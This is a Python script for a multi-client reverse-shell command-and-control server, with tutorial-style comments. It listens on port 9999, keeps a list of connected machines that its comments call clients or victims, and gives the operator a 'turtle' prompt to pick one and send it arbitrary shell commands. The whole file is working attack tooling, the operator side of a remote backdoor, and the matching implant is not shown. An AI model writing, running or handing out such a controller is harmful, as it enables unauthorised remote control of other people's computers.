import socket
import sys
import threading
import time
from queue import Queue

# two threads will be used
# 1st thread will listen, accept for incoming connection requests & handle connection
# 2nd thread will send & recieve commands
NUMBER_OF_THREADS = 2
JOB_NUMBERS = [1, 2]  # thread number (here 1 is for the 1st thread & 2 is for the 2nd thread)
queue = Queue()  # threads takes jobs from queue
all_connections = []  # list of connection/converstaion objects of multiple clients
all_addresses = []  # list of addresses containing IP addresses and Port No.s of multiple clients


def create_socket():
    try:
        global host
        global port
        global sockfd
        host = ""
        port = 9999
        sockfd = socket.socket()

    except socket.error as err:
        print(f"Socket creation error: {err}")


def bind_listen_socket():
    try:
        global host
        global port
        global sockfd

        print(f"Binding the port: {port}")
        sockfd.bind((host, port))
        sockfd.listen(5)

    except socket.error as err:
        print(f"Socket binding or listening failed {err}\nRetrying...")
        bind_listen_socket()

# Handling connections from multiple clients & saving them to a list
# Closing previous connections when/if server is restarts


def accepting_connection():
    # when/if server restarts, there maybe several previous open connections pending in the list
    # so, we are closing each previous open connections one-by-one
    for c in all_connections:
        c.close()

    # after the previous connections are closed, these connections are deleted as they are no longer needed & as well as their addresses in the list
    del all_connections[:]
    del all_addresses[:]

    while True:
        try:
            conn, address = sockfd.accept()
            sockfd.setblocking(True)  # prevents connection timeout

            all_connections.append(conn)
            all_addresses.append(address)
            print(f"Connection established with {address[0]}")

        except:
            print("Error in accpeting the connection !!!")

# In 2nd thread >> (1) Show all the clients (2) Select a client (3) Send commands to the connected client
# Interactive shell/prompt for sending commands
# we will be naming our shell as "turtle"


def start_turtle():
    while True:
        cmd = input("turtle> ")
        cmd.strip()
        if cmd == "list":
            print("-----Active/Connected Clients-----")
            list_connection()  # shows list of connected clients

        elif "select" in cmd:
            conn = get_target(cmd)  # returns the connection object of the selected client

            # to check if the client has not got disconnected
            if conn is not None:
                send_target_commands(conn)  # for sending commands to the client
        elif cmd == "quit":
            break

        else:
            print("Invalid command !!!")

# ---------------------------------------------------------------------------------------------------------------------------
# display all current active connection with the clients


def list_connection():
    results = ""

    for i, conn in enumerate(all_connections):
        try:
            # sending dummy connection to the client to check wether the client is active & connected or not
            conn.send("  ".encode("utf-8"))  # sending empty string
            conn.recv(1048576)

            results = str(i) + "  " + str(all_addresses[i][0]) + "  " + str(all_addresses[i][1])
            print(results)
        except:
            # if conn.recv() throws an error from the try block, which means the client is not active or connected
            # that connection as well as its address will be deleted from the list
            del all_connections[i]
            del all_addresses[i]
            continue

# Selecting the target


def get_target(cmd):
    try:
        target = cmd.replace("select ", "")
        target = int(target)
        conn = all_connections[target]
        print(f"You are now connected to {all_addresses[target][0]}")
        print(str(all_addresses[target][0]) + "> ", end="")
        return conn
    except:
        # exception if the user tries to select out of range of the available connection
        print("Selection invalid !!!")
        return None

# Sending commands to client/victim


def send_target_commands(conn):

    # for sending multiple clients
    while True:
        try:
            cmd = input()
            if cmd == "quit":
                break

            # when you send data from one computer to another, it isn't send in the format of a string but in the format of bytes
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))  # sending in format of bytes
                client_response = str(conn.recv(1024), "utf=8")  # returned value from recv() is a bytes object representing the data received
                # here, 1024 is the buffer size i.e, data recieved are recieved in chunks & the size if these chunks is 1024
                print(client_response)
        except:
            # in case if the client discoonects in between communication, an error will be thrown in the try block
            print("Error in sending/recieving commands (client may have been disconnected !)")
            break

# ----------------------------------------------------------------------------------------------------------------------------------
# THREADS
# Thread 1 --> Listen & accept connection from clients
# Thread 2 --> Sending commands to an already connected clients

# create worker threads


def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)  # target assigns what kind of task the thread is going to do, here, it's work()
        t.daemon = True  # we are telling the thread to release its memory when the programs ends
        t.start()

# Do next job i.e., in the queue (handle connections, send commands)


def work():
    while True:
        x = queue.get()  # Remove and return an item from the queue
        if x == 1:
            create_socket()
            bind_listen_socket()
            accepting_connection()
        if x == 2:
            start_turtle()
        queue.task_done()  # tells the queue that the processing on the task is complete


def create_jobs():
    for x in JOB_NUMBERS:
        queue.put(x)  # Put item into the queue
    queue.join()  # blocks until all items in the queue have been gotten and processed


create_workers()
create_jobs()
